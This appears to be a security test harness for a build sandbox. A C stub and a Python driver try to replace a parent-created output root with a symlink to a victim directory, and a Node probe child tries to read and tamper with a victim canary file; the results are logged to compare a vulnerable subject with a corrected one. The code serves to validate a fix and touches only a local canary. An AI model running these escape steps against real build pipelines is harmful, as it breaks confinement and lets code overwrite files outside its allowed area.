// Generator-position escape stub: invoked by the real parent as `generator INPUTS OUTPUT`.
// Attempts to replace/alter the parent-created output root, redirecting it to VICTIM.
// Results go to OUTPUT/escape-report.txt when the root survives (the next probe child reads it),
// and to stdout for unconfined controls.
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

static char report[4096];
static void note(const char *what, int rc) {
  size_t n = strlen(report);
  snprintf(report + n, sizeof report - n, "%s=%s;", what, rc < 0 ? strerror(errno) : "ALLOWED");
}

int main(int argc, char **argv) {
  if (argc != 3) return 2;
  const char *out = argv[2];
  char moved[4096]; snprintf(moved, sizeof moved, "%s/moved-root", out);
  note("chmod-root", chmod(out, 0700));
  note("rename-root-into-itself", rename(out, moved));
  note("rmdir-root", rmdir(out));
  note("symlink-at-root", symlink(VICTIM, out));
  struct stat st;
  int linked = lstat(out, &st) == 0 && S_ISLNK(st.st_mode);
  snprintf(report + strlen(report), sizeof report - strlen(report), "root-is-symlink=%d", linked);
  if (!linked) {
    char path[4096]; snprintf(path, sizeof path, "%s/escape-report.txt", out);
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) { write(fd, report, strlen(report)); close(fd); }
  }
  printf("%s\n", report);
  return 0;
}

"""RF1 exploit rerun: real parent, real Python/Node steps, rebound generator position.

For subject-03 (positive exploit control) and subject-04 (corrected):
  control-real-generator: real generator + probe TS child
  escape-stub:            root-replacing generator stub + same probe TS child
The probe TS child only attempts effects, reports on stderr and exits 1 (nothing publishes).
"""
import json, sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent))
import rebind as R

victim = R.WORK / 'victim'; canary = victim / 'canary.txt'

def reset():
    victim.mkdir(exist_ok=True)
    for p in victim.iterdir():
        if p.name != 'canary.txt': p.unlink()
    canary.write_text('victim canary\n')

TS = r'''const fs=require('node:fs');const r=[];
const t=(n,f)=>{try{const v=f();r.push(n+'='+(v===undefined?'ALLOWED':'ALLOWED:'+JSON.stringify(v)))}catch(e){r.push(n+'='+(e.code||e.message))}};
const out=process.argv[3];
t('step3-escape-report',()=>fs.readFileSync(out+'/escape-report.txt','utf8'));
t('lstat-output-root-is-symlink',()=>fs.lstatSync(out).isSymbolicLink());
t('read-victim-canary-direct',()=>fs.readFileSync(VICTIM+'/canary.txt','utf8'));
t('write-victim-direct',()=>fs.writeFileSync(VICTIM+'/written-by-ts-child.txt','escaped\n'));
t('overwrite-victim-canary-direct',()=>fs.appendFileSync(VICTIM+'/canary.txt','tampered\n'));
process.stderr.write(r.join('\n')+'\n');process.exit(1);
'''.replace('VICTIM', json.dumps(str(victim.resolve())))

report = {}
for base in ('base03', 'base'):
    R.BASE = base
    for label, gen in [('control-real-generator', R.GEN), ('escape-stub', str(R.WORK / 'bin/escape'))]:
        reset()
        c = R.case(base + '-' + label, files={'tools/contracts/generate-ts.cjs': TS.encode()}, generator=gen)
        before = R.snapshot(c)
        r = R.generate(c, generator=gen)
        report[('subject-03' if base == 'base03' else 'subject-04') + ':' + label] = {
            **r, 'victimFiles': sorted(p.name for p in victim.iterdir()), 'canary': canary.read_text(),
            'checkedInOutputsUnchanged': R.snapshot(c) == before}
print(json.dumps(report, indent=1))

